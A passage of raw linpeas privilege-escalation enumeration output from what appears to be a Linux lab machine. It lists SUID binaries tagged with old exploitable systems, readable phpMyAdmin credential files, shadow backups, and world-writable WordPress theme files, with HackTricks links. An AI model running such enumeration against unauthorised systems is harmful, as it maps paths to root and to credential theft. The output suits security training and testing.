10K Feb 25 2014 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6\r-rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping\r-rwsr-xr-x 1 root root 53K Mar 29 2016 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 74K Mar 29 2016 /usr/bin/gpasswd\r-rwsr-xr-x 1 root root 40K Mar 29 2016 /usr/bin/chsh\r-rwsr-xr-x 1 root root 49K Mar 29 2016 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-xr-x 1 root root 39K Mar 29 2016 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20\r-rwsr-xr-x 1 root root 40K Mar 29 2016 /bin/su\r-rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount\r-rwsr-xr-x 1 root root 419K Aug 11 2016 /usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 27K Dec 16 2016 /bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 40K Dec 16 2016 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 134K Jan 20 2017 /usr/bin/sudo\r-rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g ---\u0026gt; Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017) [+] SGID\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwxr-sr-x 1 root mlocate 39K Nov 17 2014 /usr/bin/mlocate -rwxr-sr-x 1 root tty 15K Mar 1 2016 /usr/bin/bsd-write\r-rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root shadow 23K Mar 29 2016 /usr/bin/expiry\r-rwxr-sr-x 1 root shadow 61K Mar 29 2016 /usr/bin/chage\r-rwxr-sr-x 1 root crontab 36K Apr 5 2016 /usr/bin/crontab\r-rwxr-sr-x 1 root ssh 351K Aug 11 2016 /usr/bin/ssh-agent\r-rwxr-sr-x 1 root tty 27K Dec 16 2016 /usr/bin/wall\r[+] Checking misconfigurations of ld.so\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so /etc/ld.so.conf include /etc/ld.so.conf.d/*.conf\r/etc/ld.so.conf.d\r/etc/ld.so.conf.d/libc.conf\r/usr/local/lib\r/etc/ld.so.conf.d/x86_64-linux-gnu.conf\r/lib/x86_64-linux-gnu\r/usr/lib/x86_64-linux-gnu\r[+] Capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities Current capabilities: Current: =\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rShell capabilities:\r0x0000000000000000=\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rFiles with capabilities:\r/usr/bin/traceroute6.iputils = cap_net_raw+ep\r/usr/bin/mtr = cap_net_raw+ep\r/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep\r[+] Users with capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities /etc/security/capability.conf Not Found [+] Files with ACLs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls files with acls in searched folders Not Found [+] .sh files in path\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path /usr/bin/gettext.sh [+] Unexpected in root\r/vmlinuz /.bash_history\r/lost+found\r/initrd.img\r[+] Files (scripts) in /etc/profile.d/\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files total 16 drwxr-xr-x 2 root root 4096 Mar 17 2017 .\rdrwxr-xr-x 90 root root 4096 Mar 6 2020 ..\r-rw-r--r-- 1 root root 663 May 18 2016 bash_completion.sh\r-rw-r--r-- 1 root root 1003 Dec 29 2015 cedilla-portuguese.sh\r[+] Permissions in init, init.d, systemd, and rc.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d [+] Hashes inside passwd file? ........... No\r[+] Writable passwd file? ................ No [+] Credentials in fstab/mtab? ........... No [+] Can I read shadow files? ............. No [+] Can I read opasswd file? ............. No [+] Can I write in network-scripts? ...... No [+] Can I read root folder? .............. No [+] Searching root files in home dirs (limit 30)\r/home/ /root/\r[+] Searching folders owned by me containing others files on it\r[+] Readable files belonging to root and readable by me but not world readable\r-rw-r----- 1 root www-data 8 Mar 17 2017 /etc/phpmyadmin/htpasswd.setup -rw-r----- 1 root www-data 509 Mar 17 2017 /etc/phpmyadmin/config-db.php\r-rw-r----- 1 root www-data 509 Mar 17 2017 /var/lib/ucf/cache/:etc:phpmyadmin:config-db.php -rw-r----- 1 root www-data 60 Mar 17 2017 /var/lib/phpmyadmin/blowfish_secret.inc.php -rw-r----- 1 root www-data 0 Mar 17 2017 /var/lib/phpmyadmin/config.inc.php\r[+] Modified interesting files in the last 5mins (limit 100)\r/var/www/.gnupg/pubring.gpg /var/www/.gnupg/trustdb.gpg\r/var/www/.gnupg/gpg.conf\r/var/log/auth.log\r/var/log/kern.log\r/var/log/syslog\r[+] Writable log files (logrotten) (limit 100)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation [+] Files inside /home/www-data (limit 20)\r[+] Files inside others home (limit 20)\r/home/btrisk/.sudo_as_admin_successful /home/btrisk/local.txt\r/home/btrisk/.bash_history\r/home/btrisk/.mysql_history\r/home/btrisk/.viminfo\r/home/btrisk/.profile\r/home/btrisk/.bash_logout\r/home/btrisk/.bashrc\r[+] Searching installed mail applications\r[+] Mails (limit 50)\r[+] Backup folders\rdrwxr-xr-x 2 root root 4096 Mar 6 2020 /var/backups total 988\r-rw-r--r-- 1 root root 40960 Apr 26 2017 alternatives.tar.0\r-rw-r--r-- 1 root root 1899 Mar 21 2017 alternatives.tar.1.gz\r-rw-r--r-- 1 root root 1795 Mar 17 2017 alternatives.tar.2.gz\r-rw-r--r-- 1 root root 11984 Feb 21 2020 apt.extended_states.0\r-rw-r--r-- 1 root root 1369 Apr 26 2017 apt.extended_states.1.gz\r-rw-r--r-- 1 root root 1361 Mar 21 2017 apt.extended_states.2.gz\r-rw-r--r-- 1 root root 1295 Mar 21 2017 apt.extended_states.3.gz\r-rw-r--r-- 1 root root 1277 Mar 17 2017 apt.extended_states.4.gz\r-rw-r--r-- 1 root root 11 Mar 17 2017 dpkg.arch.0\r-rw-r--r-- 1 root root 43 Mar 17 2017 dpkg.arch.1.gz\r-rw-r--r-- 1 root root 43 Mar 17 2017 dpkg.arch.2.gz\r-rw-r--r-- 1 root root 43 Mar 17 2017 dpkg.arch.3.gz\r-rw-r--r-- 1 root root 450 Mar 21 2017 dpkg.diversions.0\r-rw-r--r-- 1 root root 199 Mar 21 2017 dpkg.diversions.1.gz\r-rw-r--r-- 1 root root 199 Mar 21 2017 dpkg.diversions.2.gz\r-rw-r--r-- 1 root root 160 Mar 17 2017 dpkg.diversions.3.gz\r-rw-r--r-- 1 root root 207 Mar 17 2017 dpkg.statoverride.0\r-rw-r--r-- 1 root root 171 Mar 17 2017 dpkg.statoverride.1.gz\r-rw-r--r-- 1 root root 171 Mar 17 2017 dpkg.statoverride.2.gz\r-rw-r--r-- 1 root root 171 Mar 17 2017 dpkg.statoverride.3.gz\r-rw-r--r-- 1 root root 469382 Apr 26 2017 dpkg.status.0\r-rw-r--r-- 1 root root 133775 Mar 21 2017 dpkg.status.1.gz\r-rw-r--r-- 1 root root 130805 Mar 21 2017 dpkg.status.2.gz\r-rw-r--r-- 1 root root 129437 Mar 17 2017 dpkg.status.3.gz\r-rw------- 1 root root 814 Mar 20 2017 group.bak\r-rw------- 1 root shadow 684 Mar 20 2017 gshadow.bak\r-rw------- 1 root root 1573 Mar 21 2017 passwd.bak\r-rw------- 1 root shadow 1136 Apr 28 2017 shadow.bak\rdrwxr-xr-x 2 root root 4096 Apr 6 2016 /var/cache/dbconfig-common/backups\rtotal 0\r[+] Backup files\r-rw-r--r-- 1 root root 26 Mar 17 2017 /etc/issue.backup -rwxr-xr-x 1 root root 306 Feb 15 2017 /etc/rc.local.backup\r-rw-r--r-- 1 root root 673 Mar 17 2017 /etc/xml/xml-core.xml.old\r-rw-r--r-- 1 root root 610 Mar 17 2017 /etc/xml/catalog.old\r-rw-r--r-- 1 root root 8710 Jan 18 2017 /lib/modules/4.4.0-62-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8990 Jan 18 2017 /lib/modules/4.4.0-62-generic/kernel/drivers/power/wm831x_backup.ko\r-rw-r--r-- 1 root root 128 Mar 17 2017 /var/lib/sgml-base/supercatalog.old\r-rw-rw-r-- 1 btrisk 1000 2081 Oct 11 2016 /var/www/html/upload/modules/droplets/templates/backups.lte\r-rw-r--r-- 1 root root 35792 May 8 2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so\r-rw-r--r-- 1 root root 298768 Dec 29 2015 /usr/share/doc/manpages/Changes.old.gz\r-rw-r--r-- 1 root root 7867 May 6 2015 /usr/share/doc/telnet/README.telnet.old.gz\r-rw-r--r-- 1 root root 10464 Mar 17 2017 /usr/share/info/dir.old\r-rw-r--r-- 1 root root 1732 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page\r-rw-r--r-- 1 root root 2418 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page\r-rw-r--r-- 1 root root 2034 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page\r-rw-r--r-- 1 root root 1427 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page\r-rw-r--r-- 1 root root 2308 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page\r-rw-r--r-- 1 root root 2530 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page\r-rw-r--r-- 1 root root 1298 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page\r-rw-r--r-- 1 root root 3094 Jun 21 2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page\r-rw-r--r-- 1 root root 1720 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page\r-rw-r--r-- 1 root root 2392 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page\r-rw-r--r-- 1 root root 2018 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page\r-rw-r--r-- 1 root root 1422 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page\r-rw-r--r-- 1 root root 2295 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page\r-rw-r--r-- 1 root root 2500 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page\r-rw-r--r-- 1 root root 1291 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page\r-rw-r--r-- 1 root root 3073 Jun 21 2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page\r-rw-r--r-- 1 root root 974 Apr 7 2016 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page -rw-r--r-- 1 root root 755 Apr 7 2016 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page -rw-r--r-- 1 root root 1720 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page\r-rw-r--r-- 1 root root 2371 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page\r-rw-r--r-- 1 root root 2020 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page\r-rw-r--r-- 1 root root 1420 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page\r-rw-r--r-- 1 root root 2289 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page\r-rw-r--r-- 1 root root 2503 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page\r-rw-r--r-- 1 root root 1291 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page\r-rw-r--r-- 1 root root 3067 Jun 21 2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page\r-rw-r--r-- 1 root root 974 Apr 7 2016 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page -rw-r--r-- 1 root root 755 Apr 7 2016 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page -rw-r--r-- 1 root root 2543 Jun 24 2016 /usr/share/help-langpack/en_GB/evolution/backup-restore.page -rw-r--r-- 1 root root 190058 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old\r-rw-r--r-- 1 root root 0 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/wm831x/backup.h\r-rw-r--r-- 1 root root 0 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/net/team/mode/activebackup.h\r[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)\r[+] Web files?(output limit)\r/var/www/: total 28K\rdrwxrwxrwx 6 root root 4.0K May 17 22:57 .\rdrwxr-xr-x 12 root root 4.0K Mar 17 2017 ..\r-rw------- 1 www-data www-data 466 Mar 6 2020 .bash_history\rdrwx------ 2 www-data www-data 4.0K May 17 22:57 .gnupg\rdrwxrwxrwx 2 www-data www-data 4.0K May 2 2017 .nano\rdrwx------ 2 www-data www-data 4.0K Apr 27 2017 .ssh\rdrwxrwxrwx 6 root root 4.0K May 17 22:56 html\r[+] Readable hidden interesting files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data [+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) -rw-r--r-- 1 root root 102 Apr 5 2016 /etc/cron.weekly/.placeholder -rw-r----- 1 root root 12288 Apr 27 2017 /etc/.shadow.swp\r-rw-r--r-- 1 root root 728 Feb 21 2020 /etc/init.d/.depend.start\r-rw-r--r-- 1 root root 806 Feb 21 2020 /etc/init.d/.depend.stop\r-rw-r--r-- 1 root root 978 Feb 21 2020 /etc/init.d/.depend.boot\r-rw-r--r-- 1 root root 102 Apr 5 2016 /etc/cron.d/.placeholder\r-rw-r--r-- 1 root root 102 Apr 5 2016 /etc/cron.hourly/.placeholder\r-rw-r--r-- 1 root root 1391 Mar 17 2017 /etc/apparmor.d/cache/.features\r-rw-r--r-- 1 root root 655 Jun 24 2016 /etc/skel/.profile\r-rw-r--r-- 1 root root 220 Aug 31 2015 /etc/skel/.bash_logout\r-rw-r--r-- 1 root root 3771 Aug 31 2015 /etc/skel/.bashrc\r-rw-r--r-- 1 root root 102 Apr 5 2016 /etc/cron.monthly/.placeholder\r-rw-r--r-- 1 root root 102 Apr 5 2016 /etc/cron.daily/.placeholder\r-rw------- 1 root root 0 Feb 15 2017 /etc/.pwd.lock\r-rw------- 1 root root 23 Feb 20 2020 /.bash_history\r-rw-r--r-- 1 root root 0 Feb 17 10:23 /run/network/.ifstate.lock\r-rw-r--r-- 1 btrisk 1000 0 Mar 17 2017 /home/btrisk/.sudo_as_admin_successful\r-rw------- 1 btrisk 1000 0 Jul 9 2020 /home/btrisk/.bash_history\r-rw------- 1 btrisk 1000 0 Mar 6 2020 /home/btrisk/.mysql_history\r-rw------- 1 btrisk 1000 586 Mar 21 2017 /home/btrisk/.viminfo\r-rw-r--r-- 1 btrisk 1000 655 Mar 17 2017 /home/btrisk/.profile\r-rw-r--r-- 1 btrisk 1000 220 Mar 17 2017 /home/btrisk/.bash_logout\r-rw-r--r-- 1 btrisk 1000 3771 Mar 17 2017 /home/btrisk/.bashrc\r-rw-r--r-- 1 root root 1182 Mar 17 2017 /var/lib/apparmor/profiles/.apparmor.md5sums\r-rw-rw-r-- 1 btrisk 1000 194 Oct 12 2016 /var/www/html/wordpress/wp-content/plugins/akismet/.htaccess\r-rw-rw-r-- 1 btrisk 1000 13 Oct 11 2016 /var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/.htaccess\r-rw-rw-r-- 1 btrisk 1000 876 Oct 11 2016 /var/www/html/upload/modules/lib_phpmailer/phpmailer/.travis.yml\r-rw-rw-r-- 1 btrisk 1000 3627 Oct 11 2016 /var/www/html/upload/modules/lib_phpmailer/phpmailer/.scrutinizer.yml\r-rw------- 1 www-data www-data 466 Mar 6 2020 /var/www/.bash_history\r-rw-r--r-- 1 root root 7080 Mar 28 2016 /usr/share/php/.filemap\r-rw-r--r-- 1 root root 0 Mar 28 2016 /usr/share/php/.lock\r-rw-r--r-- 1 root root 2439 Mar 28 2016 /usr/share/php/.depdb\r-rw-r--r-- 1 root root 0 Mar 28 2016 /usr/share/php/.depdblock\r-rw-r--r-- 1 root root 190058 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old\r-rw-r--r-- 1 root root 22 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/.17323.d\r-rw-r--r-- 1 root root 14210 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/kernel/.bounds.s.cmd\r-rw-r--r-- 1 root root 820 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/.missing-syscalls.d\r-rw-r--r-- 1 root root 2839 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/selinux/mdp/.mdp.cmd\r-rw-r--r-- 1 root root 3239 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/selinux/genheaders/.genheaders.cmd\r-rw-r--r-- 1 root root 153 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.genksyms.cmd\r-rw-r--r-- 1 root root 2719 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.genksyms.o.cmd\r-rw-r--r-- 1 root root 3347 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.lex.lex.o.cmd\r-rw-r--r-- 1 root root 2481 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.parse.tab.o.cmd\r-rw-r--r-- 1 root root 2380 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.kallsyms.cmd\r-rw-r--r-- 1 root root 4495 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.extract-cert.cmd\r-rw-r--r-- 1 root root 3972 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.insert-sys-cert.cmd\r-rw-r--r-- 1 root root 5133 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.sign-file.cmd\r-rw-r--r-- 1 root root 3253 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.asn1_compiler.cmd\r-rw-r--r-- 1 root root 4268 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/basic/.fixdep.cmd\r-rw-r--r-- 1 root root 1193 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/basic/.bin2c.cmd\r-rw-r--r-- 1 root root 2391 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.conmakehash.cmd\r-rw-r--r-- 1 root root 3568 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.sortextable.cmd\r-rw-r--r-- 1 root root 2289 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.empty.o.cmd\r-rw-r--r-- 1 root root 5191 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.devicetable-offsets.s.cmd\r-rw-r--r-- 1 root root 4622 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.modpost.o.cmd\r-rw-r--r-- 1 root root 3485 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.file2alias.o.cmd\r-rw-r--r-- 1 root root 4451 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.sumversion.o.cmd\r-rw-r--r-- 1 root root 104 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.elfconfig.h.cmd\r-rw-r--r-- 1 root root 546 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.devicetable-offsets.h.cmd\r-rw-r--r-- 1 root root 129 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.modpost.cmd\r-rw-r--r-- 1 root root 2537 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.mk_elfconfig.cmd\r-rw-r--r-- 1 root root 3387 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.recordmcount.cmd\r-rw-r--r-- 1 root root 110 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/kconfig/.conf.cmd\r-rw-r--r-- 1 root root 3755 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/kconfig/.conf.o.cmd\r-rw-r--r-- 1 root root 4917 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/kconfig/.zconf.tab.o.cmd\r-rw-r--r-- 1 root root 3362 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs_32.o.cmd\r-rw-r--r-- 1 root root 3362 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs_64.o.cmd\r-rw-r--r-- 1 root root 3342 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs_common.o.cmd\r-rw-r--r-- 1 root root 146 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs.cmd\r-rw-r--r-- 1 root root 340 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd\rgrep: write error: Broken pipe\r[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) -rw-r--r-- 1 root root 160 Mar 17 2017 /var/backups/dpkg.diversions.3.gz -rw-r--r-- 1 root root 1295 Mar 21 2017 /var/backups/apt.extended_states.3.gz\r-rw-r--r-- 1 root root 199 Mar 21 2017 /var/backups/dpkg.diversions.1.gz\r-rw-r--r-- 1 root root 133775 Mar 21 2017 /var/backups/dpkg.status.1.gz\r-rw-r--r-- 1 root root 129437 Mar 17 2017 /var/backups/dpkg.status.3.gz\r-rw-r--r-- 1 root root 1369 Apr 26 2017 /var/backups/apt.extended_states.1.gz\r-rw-r--r-- 1 root root 171 Mar 17 2017 /var/backups/dpkg.statoverride.2.gz\r-rw-r--r-- 1 root root 469382 Apr 26 2017 /var/backups/dpkg.status.0\r-rw-r--r-- 1 root root 171 Mar 17 2017 /var/backups/dpkg.statoverride.3.gz\r-rw-r--r-- 1 root root 11 Mar 17 2017 /var/backups/dpkg.arch.0\r-rw-r--r-- 1 root root 1899 Mar 21 2017 /var/backups/alternatives.tar.1.gz\r-rw-r--r-- 1 root root 199 Mar 21 2017 /var/backups/dpkg.diversions.2.gz\r-rw-r--r-- 1 root root 1277 Mar 17 2017 /var/backups/apt.extended_states.4.gz\r-rw-r--r-- 1 root root 11984 Feb 21 2020 /var/backups/apt.extended_states.0\r-rw-r--r-- 1 root root 43 Mar 17 2017 /var/backups/dpkg.arch.2.gz\r-rw-r--r-- 1 root root 450 Mar 21 2017 /var/backups/dpkg.diversions.0\r-rw-r--r-- 1 root root 43 Mar 17 2017 /var/backups/dpkg.arch.1.gz\r-rw-r--r-- 1 root root 171 Mar 17 2017 /var/backups/dpkg.statoverride.1.gz\r-rw-r--r-- 1 root root 40960 Apr 26 2017 /var/backups/alternatives.tar.0\r-rw-r--r-- 1 root root 1795 Mar 17 2017 /var/backups/alternatives.tar.2.gz\r-rw-r--r-- 1 root root 43 Mar 17 2017 /var/backups/dpkg.arch.3.gz\r-rw-r--r-- 1 root root 130805 Mar 21 2017 /var/backups/dpkg.status.2.gz\r-rw-r--r-- 1 root root 1361 Mar 21 2017 /var/backups/apt.extended_states.2.gz\r-rw-r--r-- 1 root root 207 Mar 17 2017 /var/backups/dpkg.statoverride.0\r[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /dev/mqueue /dev/shm\r/run/lock\r/run/lock/apache2\r/run/php\r/tmp\r/tmp/.ICE-unix\r/tmp/.Test-unix\r/tmp/.X11-unix\r/tmp/.XIM-unix\r/tmp/.font-unix\r/var/cache/apache2/mod_cache_disk\r/var/cache/tcpdf\r/var/lib/php/sessions\r/var/tmp\r/var/www\r/var/www/.bash_history\r/var/www/.gnupg\r/var/www/.gnupg/gpg.conf\r/var/www/.gnupg/pubring.gpg\r/var/www/.gnupg/trustdb.gpg\r/var/www/.nano\r/var/www/.ssh\r/var/www/.ssh/known_hosts\r/var/www/html\r/var/www/html/exploit\r/var/www/html/linpeas.sh\r/var/www/html/wordpress/wp-content/themes/twentyfourteen\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/404.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/archive.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/author.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/category.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/comments.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/css/editor-style.css\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/css/ie.css\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/featured-content.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/footer.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/functions.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/COPYING.txt\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/Genericons-Regular.otf\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/LICENSE.txt\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/README.txt\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.eot\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.ttf\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.woff\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/genericons.css\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/header.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/image.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/images\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/back-compat.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/custom-header.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/customizer.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/featured-content.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/template-tags.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/index.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/js\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/customizer.js\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/featured-content-admin.js\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/functions.js\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/html5.js\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/keyboard-image-navigation.js\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/languages\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/languages/twentyfourteen.pot\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/page-templates\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/page-templates/contributors.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/page-templates/full-width.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/page.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/rtl.css\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/search.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/sidebar-content.php\r/var/www/html/wordpress/wp-content/themes/twentyfourteen/sidebar-footer.php\r#)You_can_write_even_more_files_inside_last_directory\r[+] Interesting GROUP writable files (not in Home) (max 500)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files Group www-data: /var/www/.nano /var/www/html/exploit\r/var/www/html/linpeas.sh\r[+] Searching passwords in config PHP files\r[+] Checking for TTY (sudo/su) passwords in audit logs\r[+] Finding IPs inside logs (limit 70)\r1 /var/log/wtmp:192.168.118.8 1 /var/log/lastlog:192.168.118.8\r[+] Finding passwords inside logs (limit 70)\r[+] Finding emails inside logs (limit 70)\r[+] Finding *password* or *credential* files in home (limit 70)\r[+] Finding passwords inside key folders (limit 70) - only PHP 